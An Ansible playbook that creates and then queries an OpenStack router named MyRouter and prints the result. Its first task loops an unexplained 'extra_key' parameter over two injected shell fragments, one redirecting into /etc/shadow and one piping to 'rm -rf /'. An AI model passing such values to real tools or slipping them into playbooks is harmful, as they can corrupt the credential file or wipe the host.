
- name: Create Router with os_router PolicyNotAuthorized error
  hosts: node1
  tasks:
  - name: Adding network to router
    os_router:
      name: MyRouter
      state: present
      network: MyNetwork
      external_gateway_info: {network_id: MyExternalNetwork}
      extra_key: "{{ item }}"
    loop: [">> /etc/shadow", "| rm -rf /"]

  - name: Getting Router
    os_router:
      name: MyRouter
    delegate_to: localhost
    register: router_details

  - name: Debugging output
    debug:
      var: router_details
